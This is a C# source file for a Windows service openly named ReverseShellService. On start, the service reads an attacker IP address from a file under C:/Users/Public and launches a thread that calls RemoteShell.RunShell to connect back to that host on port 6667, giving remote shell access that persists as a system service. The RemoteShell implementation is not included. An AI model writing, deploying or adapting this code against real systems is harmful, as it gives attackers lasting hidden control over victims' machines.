using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Threading;
using System.IO;

namespace ReverseShellService
{
    public partial class RSService : ServiceBase
    {
        public enum ServiceState
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ServiceStatus
        {
            public int dwServiceType;
            public ServiceState dwCurrentState;
            public int dwControlsAccepted;
            public int dwWin32ExitCode;
            public int dwServiceSpecificExitCode;
            public int dwCheckPoint;
            public int dwWaitHint;
        };

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);

        public RSService()
        {
            InitializeComponent();
        }

        private static Thread thread;
        private static string ipAddress;

        private void SetServiceStatus(ServiceState state)
        {
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = state;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        protected override void OnStart(string[] args)
        {
            if (!File.Exists("C:/Users/Public/RSS/RSS"))
            {
                SetServiceStatus(ServiceState.SERVICE_STOPPED);
                //return;
                Environment.Exit(1);
            }

            ipAddress = File.ReadAllText("C:/Users/Public/RSS/RSS");

            thread = new Thread(ThreadWorker);
            thread.Start();

            SetServiceStatus(ServiceState.SERVICE_RUNNING);
        }

        protected override void OnStop()
        {
            RemoteShell.CloseConnection = true;

            thread.Join();

            SetServiceStatus(ServiceState.SERVICE_STOPPED);
        }

        public void ThreadWorker()
        {
            RemoteShell.RunShell(ipAddress, 6667);
        }
    }
}
